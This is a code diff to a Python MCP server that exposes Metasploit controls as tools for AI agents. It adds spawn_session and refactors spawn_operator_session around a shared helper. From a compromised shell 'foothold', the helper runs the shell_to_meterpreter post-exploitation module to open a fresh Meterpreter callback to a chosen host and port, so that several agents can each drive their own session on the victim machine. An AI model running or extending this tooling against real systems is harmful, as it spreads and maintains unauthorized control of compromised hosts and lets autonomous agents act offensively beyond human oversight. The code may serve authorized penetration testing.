@@ -722,6 +722,79 @@ def create_server() -> FastMCP:
         return json.dumps({"status": "released" if existed else "not_reserved",
                            "session_id": str(session_id)})
 
+    def _spawn_sibling(session_id: str, lhost: str, lport: int, label: str) -> dict:
+        """Shared spawn primitive: re-stage a fresh session from a SHELL foothold
+        via shell_to_meterpreter and return the new session id. Returns a dict:
+        {new_sid} on success, or {needs_manual|unconfirmed|error} otherwise."""
+        try:
+            validate_option_value(lhost)
+        except ValidationError as e:
+            return {"error": f"{e}"}
+        client, err = _require_client()
+        if err:
+            return {"error": err}
+        sessions = client.sessions.list
+        if str(session_id) not in {str(k) for k in sessions}:
+            return {"error": f"Session {session_id} not found or dead."}
+        key = int(session_id) if str(session_id).isdigit() else session_id
+        stype = str(sessions[key].get("type", ""))
+        if "meterpreter" in stype.lower():
+            return {"needs_manual": (
+                "Source is a Meterpreter session — can't re-stage a sibling from "
+                "here. Catch another callback (or open one in tmux) and reserve/"
+                "assign it manually."
+            )}
+        before = {str(k) for k in sessions}
+        try:
+            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
+            mod["SESSION"] = int(session_id)
+            mod["LHOST"] = lhost
+            mod["LPORT"] = int(lport)
+            result = mod.execute()
+            err_msg = _execute_error(result, expect_job=True)
+            if err_msg:
+                return {"error": f"{label} spawn failed: {err_msg}"}
+        except Exception as e:
+            return {"error": f"{label} spawn failed: {e}"}
+        for _ in range(30):
+            time.sleep(1)
+            fresh = {str(k) for k in client.sessions.list} - before
+            if fresh:
+                return {"new_sid": sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]}
+        return {"unconfirmed": result.get("job_id")}
+
+    @mcp.tool()
+    @_serialized
+    def spawn_session(session_id: str = "", lhost: str = "", lport: int = 0) -> str:
+        """Spawn a SECOND session from a foothold for a DIFFERENT AGENT to use.
+
+        Use this so two agents never drive the same session's shell at once
+        (their commands and any interactive/stateful state would collide). When
+        an agent needs to interact with a host another agent already has, spawn
+        it its own session here and hand back the new id. Not reserved — it's a
+        normal agent session.
+
+        Reliable from a SHELL source (re-stages via shell_to_meterpreter); from
+        a Meterpreter source returns needs_manual (no shell to re-stage).
+
+        Args:
+            session_id: An existing foothold session on the host. Required.
+            lhost: Callback host for the new session. Required.
+            lport: Callback port — use one distinct from other handlers. Required.
+        """
+        if not session_id or not lhost or not lport:
+            return "ERROR: session_id, lhost, and lport are required."
+        r = _spawn_sibling(session_id, lhost, int(lport), "Agent-session")
+        if "error" in r:
+            return f"ERROR: {r['error']}"
+        if "needs_manual" in r:
+            return json.dumps({"status": "needs_manual", "message": r["needs_manual"]})
+        if "unconfirmed" in r:
+            return json.dumps({"status": "spawn_started_unconfirmed", "job_id": r["unconfirmed"],
+                               "message": "No new session within 30s — poll list_sessions."})
+        return json.dumps({"status": "spawned", "session_id": r["new_sid"],
+                           "from_session_id": str(session_id)})
+
     @mcp.tool()
     @_serialized
     def spawn_operator_session(session_id: str = "", lhost: str = "", lport: int = 4444) -> str:
@@ -746,54 +819,22 @@ def create_server() -> FastMCP:
         """
         if not session_id or not lhost:
             return "ERROR: session_id and lhost are required."
-        try:
-            validate_option_value(lhost)
-        except ValidationError as e:
-            return f"ERROR: {e}"
-        client, err = _require_client()
-        if err:
-            return err
-        sessions = client.sessions.list
-        if str(session_id) not in {str(k) for k in sessions}:
-            return f"ERROR: Session {session_id} not found or dead."
-        stype = str(sessions[int(session_id) if str(session_id).isdigit() else session_id].get("type", ""))
-        if "meterpreter" in stype.lower():
+        r = _spawn_sibling(session_id, lhost, int(lport), "Operator-session")
+        if "error" in r:
+            return f"ERROR: {r['error']}"
+        if "needs_manual" in r:
             return json.dumps({
                 "status": "needs_manual",
-                "message": (
-                    "Source is a Meterpreter session — can't re-stage a sibling "
-                    "from here. Catch a second callback (or open one in tmux) and "
-                    "call reserve_operator_session on it."
-                ),
+                "message": r["needs_manual"] + " Then call reserve_operator_session on it.",
             })
-        before = {str(k) for k in sessions}
-        try:
-            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
-            mod["SESSION"] = int(session_id)
-            mod["LHOST"] = lhost
-            mod["LPORT"] = int(lport)
-            result = mod.execute()
-            err_msg = _execute_error(result, expect_job=True)
-            if err_msg:
-                return f"ERROR: Operator-session spawn failed: {err_msg}"
-        except Exception as e:
-            return f"ERROR: Operator-session spawn failed: {e}"
-        # Poll for the newly-created session, then reserve it.
-        new_sid = None
-        for _ in range(30):
-            time.sleep(1)
-            now = {str(k) for k in client.sessions.list}
-            fresh = now - before
-            if fresh:
-                new_sid = sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]
-                break
-        if new_sid is None:
+        if "unconfirmed" in r:
             return json.dumps({
                 "status": "spawn_started_unconfirmed",
-                "job_id": result.get("job_id"),
+                "job_id": r["unconfirmed"],
                 "message": ("Spawn launched but no new session appeared within 30s. "
                             "Poll list_sessions; reserve it with reserve_operator_session."),
             })
+        new_sid = r["new_sid"]
         reserved = _load_reserved()
         reserved[new_sid] = {
             "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
